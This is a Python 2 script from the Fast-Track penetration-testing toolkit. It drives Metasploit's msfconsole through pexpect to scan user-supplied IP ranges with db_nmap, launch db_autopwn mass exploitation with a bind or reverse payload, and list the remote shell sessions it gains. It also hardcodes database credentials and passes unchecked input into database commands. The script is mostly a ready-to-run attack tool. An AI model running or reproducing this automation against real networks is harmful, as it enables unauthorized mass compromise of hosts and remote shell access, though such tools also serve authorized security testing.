#!/usr/bin/env python
import pexpect
import sys
import os
import time
import re

definepath=os.getcwd()
sys.path.append("%s/bin/ftsrc/" % (definepath))
import include

try:
   import psyco
   psyco.full()
except ImportError:
   pass

try:
   ipaddr=sys.argv[3]
except IndexError:
   include.print_banner()
   ipaddr=raw_input("""
Metasploit Autopwn Automation:

    you must <3 the 2uro. and his two rows of teeth.
    
    http://www.metasploit.com

    This tool specifically piggy backs some commands from the Metasploit 
    Framework and does not modify the Metasploit Framework in any way. This 
    is simply to automate some tasks from the autopwn feature already developed 
    by the Metasploit crew.

    Simple, enter the IP ranges like you would in NMap i.e. 192.168.1.-254 
    or 192.168.1.1/24 or whatever you want and it'll run against those hosts. 
    Additionally you can place NMAP commands within the autopwn ip ranges bar, 
    for example, if you want to scan even if a host "appears down" just do 
    -PN 192.168.1.1-254 or whatever...you can use all NMap syntaxes in the 
    Autopwn IP Ranges portion.

    When it has completed exploiting simply type this:
  
    sessions -l (lists the shells spawned)
    sessions -i <id> (jumps you into the sessions) 2uro

    Example 1: -PN 192.168.1.1
    Example 2: 192.168.1.1-254
    Example 3: -P0 -v -A 192.168.1.1
    Example 4: 192.168.1.1/24

         Enter the IP ranges to autopwn or (q)uit FastTrack: """)
if ipaddr == 'quit' or ipaddr == 'q': 
   print "\n\nExiting Fast-Track autopwn...\n\n"
   sys.exit()
# Spawn instance of msfconsole
try:
   option1=sys.argv[4]
except IndexError:
   option1=raw_input("""
    Do you want to do a bind or reverse payload?

    Bind = direct connection to the server
    Reverse = connection originates from server

    1. Bind
    2. Reverse

    Enter number: """)
if option1 == 'quit' or option1 == 'q':
   print "\n\n    Exiting Fast-Track autopwn...\n\n"
   sys.exit()
if option1 == '1': option1='-b'
if option1 == '2': option1='-r'
print "    Launching MSFConsole and prepping autopwn..."

# define metasploit path
meta_path=file("%s/config/fasttrack_config" % (definepath),"r").readlines()
for line in meta_path:
    line=line.rstrip()
    match=re.search("METASPLOIT_PATH",line)
    if match:
       line=line.replace("METASPLOIT_PATH=","")
       metapath=line

try:
#set the db variables               <3 2uro
   print "please enter the new databases name: "
   dbase = sys.stdin.readline()
#spawn msfconsole    
   child1 = pexpect.spawn('msfconsole')

# dump the  data base               <3 2uro 1
   child1.sendline ('pg_dump -s -f db.dump %s' % dbase)
# clear the backed up schema        <3 2uro 2
   child1.sendline ('dropdb %s' % dbase)      
# create the database               <3 2uro 3
   child1.sendline( 'createdb %s' % dbase)
# restore schem
   child1.sendline( 'pg_restore db.dump > psql %s' % dbase)
# load the db                       <3 2uro 4
   child1.sendline ('db_connect root:breakout@127.0.0.1:5432/%s' % dbase)
 
# run actual port scans
   child1.sendline ('''db_nmap %s ''' % (ipaddr))
# run actual exploitation
   child1.sendline ('db_autopwn -p -t -e %s' % (option1))
   child1.sendline ('sleep 5')
   child1.sendline ('jobs -K')
   child1.sendline ('\n\n\n')
   child1.sendline ('sessions -l')
   child1.sendline ('echo "If it states No sessions, then you were unsuccessful. Simply type sessions -i <id> to jump into a shell"')
# jump to pid
   child1.interact()
except Exception, e:
       print e
       print "\n    Exiting Fast-Track...\n"
